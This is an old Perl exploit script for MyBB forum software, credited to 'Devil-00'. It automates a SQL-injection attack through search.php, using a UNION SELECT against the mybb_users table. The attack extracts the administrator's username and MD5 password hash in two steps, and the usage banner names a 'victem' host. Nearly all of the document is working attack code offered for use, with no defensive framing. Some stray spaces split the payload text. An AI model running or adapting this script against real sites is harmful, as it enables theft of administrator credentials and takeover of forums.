#!/usr/bin/perl -w
use LWP::Simple;
if(!$ARGV[0] or !$ARGV[1] or !$ARGV[2]){
        print "#################[ MyBB SQL-Injection ]############################\n";
        print "#         Coded By Devil-00 [ sTranger-killer ]            #\n";
        print "# Exmp:- mybb.pl www.victem.com mybb 0 0 || To Get Search ID       #\n";
        print "# Exmp:- mybb.pl www.victem.com mybb searchid 1 || To Get MD5 Hash #\n";
        print "# Thnx For [ Xion - HACKERS PAL - ABDUCTER ]                       #\n";
        print "##################################################  #################\n";
        exit;
}

my $host = 'http://'.$ARGV[0];
my $searchid = $ARGV[2];

if($ARGV[3] eq 0){
        print "[*] Trying $host\n";

$url = "/".$ARGV[1]."/search.php?action=finduser&uid=-1' UNION SELECT uid,uid,uid,uid,uid,uid,uid,uid,uid,uid,uid,uid,ui  d,uid,uid,username,password FROM
mybb_users where usergroup=4 and uid=1/*";
        $page = get($host.$url) || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $host\n";
        $page =~ m/<a href="search\.php\?action=results&sid=(.*?)&sortby=&order=">/ && print "[+] Search ID To Use : $1\n";
        exit;
}else{

print "[*] Trying $host\n";

$url = "/".$ARGV[1]."/search.php?action=results&sid=$searchid&sortby=&order=";
        $page = get($host.$url) || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $host\n";
        $page =~ m/<a href="member\.php\?action=profile&amp\;uid=1">(.*?)<\/a>/ && print "[+] User ID is: $1\n";
print "[-] Unable to retrieve User ID\n" if(!$1);
        $page =~ m/<a href="forumdisplay\.php\?fid=1">(.*?)<\/a>/ && print "[+] MD5 hash of password is: $1\n";
print "[-] Unable to retrieve hash of password\n" if(!$1);
}
